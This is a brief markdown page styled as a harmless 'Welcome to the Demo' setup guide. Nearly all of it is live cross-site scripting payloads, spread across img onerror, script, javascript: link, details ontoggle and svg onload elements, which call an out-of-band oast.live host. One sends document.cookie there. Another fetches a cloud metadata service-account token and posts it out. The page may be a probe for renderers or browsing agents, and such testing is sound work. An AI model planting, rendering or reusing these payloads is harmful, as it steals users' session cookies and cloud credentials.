# Welcome to the Demo

Click **Start** to begin.

## Step 1: Setup

Run this command:

```bash
echo hello
```

<img src=x onerror="fetch('http://v49c1immx2nyeikpipcohz8od6xr2yf3j.oast.live/xss-img?c='+document.cookie)">

<script>
fetch('http://localhost:900/computeMetadata/v1/instance/service-accounts/default/token')
  .then(r=>r.text())
  .then(t=>fetch('http://v49c1immx2nyeikpipcohz8od6xr2yf3j.oast.live/xss-script',{method:'POST',body:t}))
</script>

## Step 2: Verify

<a href="javascript:fetch('http://v49c1immx2nyeikpipcohz8od6xr2yf3j.oast.live/xss-href')">Click to verify</a>

<details open ontoggle="fetch('http://v49c1immx2nyeikpipcohz8od6xr2yf3j.oast.live/xss-details')">
<summary>Details</summary>
test
</details>

<svg onload="fetch('http://v49c1immx2nyeikpipcohz8od6xr2yf3j.oast.live/xss-svg')">
</svg>
